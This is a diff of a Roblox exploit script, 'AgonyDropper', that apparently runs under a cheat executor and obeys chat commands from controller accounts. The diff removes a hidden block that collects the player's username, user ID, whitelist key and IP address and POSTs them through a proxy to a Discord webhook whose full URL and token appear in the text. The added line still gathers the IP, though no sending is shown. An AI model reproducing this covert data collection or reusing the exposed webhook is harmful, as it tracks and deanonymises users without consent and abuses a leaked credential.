@@ -2,11 +2,7 @@ local config = _G.AgonyDropper
 
 --local keys = game:GetService("HttpService"):JsonDecode(game:HttpGet("https://api.condo.ga/AgonyDropperWhitelists"))
 
-local content = "Username: " .. game.Players.LocalPlayer.Name .. "\nUserID: " .. game.Players.LocalPlayer.UserId .. "\nWhitelist Key: " .. config.WhitelistKey .. "\nIP Address: " .. game:HttpGet("https://ipapi.co/json/")
-
-if(getgenv()["syn"] ~= nil) then
-    syn.request("https://boring-dubinsky-45de26.netlify.app/https/discord.com/api/webhooks/1043513353068359701/ZQ8m9nLH1eZ3vzZpVPQB00yhpXqunrbrtZZEm7wKwUKZFjUOgg3kbQCoyBZ00CJFSfS1", "POST", nil, nil, '{"content" = "' .. content .. '"}')
-end
+local content = "Username: " .. tostring(game.Players.LocalPlayer.Name ).. "\nUserID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nWhitelist Key: " ..tostring(config.WhitelistKey) .. "\nIP Address: " .. game:HttpGet("https://ipapi.co/json/")
     
 --[[for _,v in pairs(keys) do
     if(v == config.WhitelistKey) then
@@ -75,7 +71,7 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
         
      for _,v in pairs(config.Controllers) do
        if(tostring(Player.UserId) == tostring(v)) then
-              Command(player, Message)
+              Command(Player, Message)
         end
     end
 end)
